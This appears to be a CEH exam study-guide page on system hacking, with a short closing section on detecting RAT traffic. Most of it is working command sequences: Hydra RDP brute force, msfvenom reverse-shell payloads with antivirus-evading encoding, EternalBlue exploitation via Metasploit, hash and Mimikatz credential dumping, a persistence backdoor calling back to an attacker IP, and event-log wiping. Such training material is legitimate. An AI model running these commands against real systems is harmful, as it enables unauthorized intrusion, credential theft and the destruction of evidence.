---
layout: default
title: Domain 2 - System Hacking & Exploitation
parent: Domains
nav_order: 2
description: "Remote Access Trojans, RDP cracking, credential harvesting, and system exploitation techniques."
has_children: true
---

# Domain 2: System Hacking & Exploitation

## Overview

This domain covers breaking into systems and maintaining access. You'll crack credentials, exploit vulnerabilities, and maintain persistence.

**Key Topics:**
- Remote Access Trojans (RAT) - Metasploit, msfvenom, payloads
- RDP cracking with Hydra
- Windows exploitation (EternalBlue / MS17-010)
- Windows post-exploitation core path (getsystem, hashdump, persistence)
- Credential dumping (hashdump, Mimikatz) and hash cracking
- SMB exploitation with weak credentials
- Detection and analysis of RAT activity

**Duration:** 15-20 minutes per task  
**Difficulty:** Medium  
**Tools:** Hydra, Metasploit, msfvenom, Mimikatz, Hashcat, John

---

## 2.1 Remote Access Trojans (RAT)

### What is a RAT?

A **Remote Access Trojan (RAT)** is malware that gives an attacker complete remote control over a victim's computer, similar to legitimate remote administration tools but without authorization.

**Key Characteristics:**
- **Backdoor Access:** Hidden method to reconnect
- **Full System Control:** Execute commands, access files
- **Persistence:** Survives reboots via registry/cron jobs
- **Stealth:** Often hides processes and network connections
- **Data Exfiltration:** Can steal files and credentials

### Common RATs in Exams

1. **Metasploit Meterpreter** - Primary tool used in exams
2. **n-Stealth** - Commercial RAT (legacy)
3. **Poison Ivy** - Older RAT (historical reference)
4. **Real VNC / TeamViewer** - Legitimate tools abused by attackers

### Attack Chain

> **In plain English:** This is the life cycle of a break-in — get in, stay in, talk to home base, run commands, steal data.

```
Phase 1: Initial Access
└─ Attacker delivers payload (email, website, exploit)
└─ Victim executes malware
└─ RAT installs itself on system

Phase 2: Persistence
└─ Windows: Registry, scheduled task, DLL injection
└─ Linux/Mac: Cron job, bashrc modification, systemd service

Phase 3: Communication (Reverse Shell)
└─ Victim initiates connection to attacker (bypasses firewall)
└─ Attacker gains shell prompt on victim

Phase 4: Command Execution
└─ Attacker types commands, victim executes
└─ Returns output to attacker

Phase 5: Data Exfiltration
└─ Attacker steals files, credentials, data
```

---

## 2.2 RDP Cracking

### What It Does
Uses Hydra to guess Windows Remote Desktop (RDP) logins by trying password after password until one works (brute force) — like trying every key on a ring until the door opens.

```bash
# Basic RDP crack — try every password in rockyou.txt for user Administrator
hydra -l Administrator -P rockyou.txt rdp://192.168.1.5

# With specific username
hydra -l admin -P password_list.txt rdp://192.168.1.50:3389

# Try multiple usernames
hydra -L usernames.txt -P passwords.txt rdp://192.168.1.5

# Verbose output
hydra -l admin -P passwords.txt rdp://192.168.1.5 -v
```

**Expected Output:**
```
[3389][rdp] host: 192.168.1.50   login: Administrator   password: MyPassword123
```

---

## 2.3 File Encryption & Decryption

### Hash Cracking

A hash is a one-way scrambled version of a password. You can't "unscramble" it, so you guess passwords, hash each guess, and look for a match.

```bash
# Identify hash type — tells you which algorithm made it (so you pick the right mode)
hashid hashvalue

# Crack SHA1
hashcat -m 100 -a 0 hashfile rockyou.txt

# Crack SHA256
hashcat -m 1400 -a 0 hashfile rockyou.txt

# Using John
john hashes.txt --wordlist=rockyou.txt
```

---

## 2.4 SMB Exploitation

### Accessing Shares with Weak Credentials

SMB (Server Message Block) is the Windows file-sharing protocol. If a shared folder has a weak login, `smbclient` lets you connect and browse it like an FTP drive.

```bash
# Access share with username/password
smbclient //192.168.1.5/Documents -U admin%password123

# List directories
ls

# Download files
get secret.txt

# Download entire directory
recurse ON
mget *
```

---

## 2.5 Metasploit & Payload Generation

### Msfvenom - Payload Generation

A payload (the malicious file the victim runs) is built with `msfvenom`. When the victim opens it, it phones home to your machine (LHOST/LPORT) and hands you a remote shell.

```bash
# Windows reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe > backdoor.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f elf > linux_shell

# With obfuscation
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe > obfuscated.exe          # -e/-i scramble the file 5x to dodge basic antivirus
```

### Metasploit Handler

The handler is the "listener" on your side that catches the connection when the victim runs your payload — set it up before delivering the file.

```bash
msfconsole
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.100
msf> set LPORT 4444
msf> run
```

### EternalBlue (MS17-010) - Classic Windows Exploit

The most common direct-exploit path in CEH labs. Hits unpatched Windows (7 / Server 2008/2012) over SMB (port 445) and drops you straight to a SYSTEM shell.

```bash
# 1. Confirm the target is vulnerable
nmap -p445 --script smb-vuln-ms17-010 192.168.1.5

# 2. Exploit
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS 192.168.1.5
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.100
msf> run
```

> **Exam tip:** EternalBlue lands you as **NT AUTHORITY\SYSTEM** already — no privesc needed. Go straight to `hashdump`.

### Meterpreter Commands

Meterpreter is the interactive shell you get on the victim after a successful exploit — these are the everyday commands you'll run inside it.

```
meterpreter > getuid                    # Show which account you're running as
meterpreter > sysinfo                   # System info
meterpreter > ps                        # List processes
meterpreter > download file.txt /tmp/   # Download file
meterpreter > upload evil.exe c:\temp\  # Upload file
meterpreter > reg query HKLM\\Software  # Query registry
```

---

## 2.6 Windows Post-Exploitation - Core Path

### What It Does

Once you have a Meterpreter session, this is the **standard CEH sequence**: confirm who you are → escalate to SYSTEM → dump password hashes → crack them → (optionally) persist and clean up. Follow it in order.

### Step 1 — Check Privilege

```
meterpreter > getuid                    # Who am I?
meterpreter > sysinfo                   # OS, arch, domain
```

If `getuid` already shows `NT AUTHORITY\SYSTEM` (e.g. after EternalBlue), skip to Step 3.

### Step 2 — Escalate to SYSTEM

```
meterpreter > getsystem                 # Auto privesc to SYSTEM
meterpreter > getuid                    # Verify: NT AUTHORITY\SYSTEM
```

If `getsystem` fails, try a UAC bypass or local exploit suggester:

```
meterpreter > background
msf> use post/multi/recon/local_exploit_suggester
msf> set SESSION 1
msf> run                                # Lists privesc exploits that fit
```

### Step 3 — Dump Password Hashes

```
meterpreter > hashdump                  # Copy out the SAM (Windows' local password database) as NTLM hashes
```

The NTLM hash is the scrambled form of a Windows password. You can't read it directly — you crack it in Step 5.

**Output format** (`user:RID:LMhash:NTLMhash:::`):
```
Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
The 4th field is the **NTLM hash** — that's what you crack.

> **Need SYSTEM first.** `hashdump` requires SYSTEM. That's why Step 2 comes before it.

### Step 4 — Grab Plaintext Credentials (Mimikatz / Kiwi)

Where Step 3 gives you scrambled hashes, Kiwi (the Meterpreter version of Mimikatz) can pull readable passwords straight out of Windows memory — no cracking needed.

```
meterpreter > load kiwi                 # Load Mimikatz module
meterpreter > creds_all                 # All cached creds
meterpreter > lsa_dump_sam              # SAM hashes
meterpreter > lsa_dump_secrets          # LSA secrets
```

### Step 5 — Crack the NTLM Hash

Feed the NTLM hashes from Step 3 to a cracker. It hashes each word in the wordlist and stops when one matches — revealing the plaintext password.

```bash
# NTLM = hashcat mode 1000
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt

# Or John
john --format=NT ntlm_hashes.txt --wordlist=rockyou.txt
```

### Step 6 — Persistence (optional)

Persistence plants a backdoor that reconnects automatically, so you keep access even after the victim reboots.

```
meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.100
```
- `-X` start at boot, `-i 30` retry every 30s, `-r` callback IP

### Step 7 — Clear Tracks (optional)

Clearing logs erases the evidence of your activity so defenders can't see what you did.

```
meterpreter > clearev                   # Wipe Windows event logs (Application, System, Security)
```

> **CEH core path in one line:** `getuid → getsystem → hashdump → crack (hashcat -m 1000) → loot`.

---

## 2.7 Detecting RAT Activity

### In Network Traffic (Wireshark)

This flips to the defender's view: how to spot a RAT by the odd traffic it leaves behind. The giveaway is a machine reaching *out* to a stranger and staying connected far too long.

1. **Reverse Connection Pattern**
   - Victim IP → Unknown External IP on non-standard port
   - Example: 192.168.1.50 → 203.0.113.45 on port 4444

2. **Suspicious Ports**
   - 4444, 5555, 6666, 7777, 8888 (Metasploit)
   - 31337 (classic backdoor port)
   - Random high ports (>10000)

3. **Long Duration Connections**
   - RAT connection: Hours/days
   - Normal services: Minutes

**Wireshark Analysis:**
```
Filter: ip.dst == <external_ip>
Look for: Reverse TCP connection, unusual port, long duration
```

---

## See Also

- **[Commands Reference](commands.html)** - Hydra, Metasploit syntax
- **[Challenges](../challenges/all-challenges.html)** - Real RDP cracking examples
- **[Domain 1: Scanning](../domain-1-network-scanning/)**
- **[Domain 6: Traffic Analysis](../domain-6-traffic-analysis/)** - RAT detection

---

**Next Step:** Review [commands](commands.html), then practice [challenges](../challenges/all-challenges.html)
